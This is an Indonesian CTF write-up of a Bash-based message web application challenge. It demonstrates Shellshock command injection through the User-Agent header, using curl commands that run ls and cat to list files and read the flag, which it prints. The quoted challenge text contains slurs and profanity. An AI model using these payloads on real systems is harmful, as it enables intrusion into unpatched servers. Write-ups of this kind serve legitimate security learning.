Deskripsi soal: 

<pre>
"How did I end up here?" is the only question you can think of since you've become a high school teacher. 
Let's face it, you hate children. Bunch of egocentric retards. Anyway, you are not going to take it anymore. 
It's time to have your little midlife crisis right in the face of these fuckers.
Good thing that you're in the middle of some project days and these little dipshits wrote a simple message storing web application. 
How cute. It's written in bash... that's... that's... aw- no... bashful. 
You've got the source, you've got the skills. 0wn the shit out of this and show them who's b0ss.
</pre>

URL: https://school.fluxfingers.net:1503

Peserta diberikan soal dimana sebuah website dapat meng-handle Bash script. Sebenarnya kami tidak berhasil tepat waktu menyelesaikan tantangan yang satu ini, tetapi tidak ada salahnya kami membagikan cara penyelesaiannya.
<br />
Jadi, pada soal tantangan kali ini kami mencoba untuk melakukan command injection melalui header tepatnya pada sisi User-Agent. Kami menggunakan trigger exploit <b>Shellshock</b> untuk mengetes kerentanan apakah bash yang terdapat pada situs ini memiliki kerentanan akan serangan tersebut.
<br />
Kemudian , untuk mencoba trigger exploit tersebut kami menggunakan curl untuk menjalankan custom User-Agent yang sebelumnya sudah kami beri trigger exploitnya. Selanjutnya kami menjalankan perintah untuk melaksanakan directory listing dengan menggunakan command "ls"<br />
```bash
curl -A "() { :;}; /bin/ls;" https://school.fluxfingers.net:1503/?sessid=sessid_anda
```
Voila! terdapat beberapa file - file yang menarik disini, berarti ini menunjukkan trigger exploit tersebut berjalan dengan baik.
<pre>
404.sh
flag
home.html
home.sh
index.sh
</pre>
Terlihat file <b>flag</b> yang muncul dimana kami yakin itulah file yang menyimpan kalimat dari flag itu sendiri. Maka, perintah terakhir yang dijalankan ialah perintah "cat":
<br />
```bash
curl -A "() { :;}; /bin/cat flag;" https://school.fluxfingers.net:1503/?sessid=sessid_anda
```
<br />
Didapatkan flag: <b>flag{as_classic_as_it_could_be}</b>
